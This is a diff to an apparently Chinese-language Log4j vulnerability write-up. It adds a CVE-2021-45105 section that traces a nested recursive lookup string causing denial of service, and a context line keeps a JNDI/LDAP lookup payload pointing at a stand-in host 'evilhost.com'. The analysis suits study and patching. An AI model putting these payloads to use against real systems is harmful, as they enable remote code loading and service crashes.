@@ -143,7 +143,39 @@ ${jndi:ldap://127.0.0.1#evilhost.com:1389/exp}
 
 
 
+## CVE-2021-45105
 
+这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。
+
+```java
+${${::-${::-$${::-$}}}}
+|
+|
+${::-${::-$${::-$}}}
+然后在 this.substitute(event, bufName, 0, bufName.length());
+|
+|
+::-::-$${::-$}
+然后在 this.substitute(event, bufName, 0, bufName.length());
+|
+|
+::-$${::-$}
+|
+|
+${::-$}
+|
+|
+::-$ 会进入一个异常
+```
+![image](https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png)
+
+
+~~说不定其他解析表达式也存在。。。。~~
+
+
+https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor
+
+https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc
 
 
 
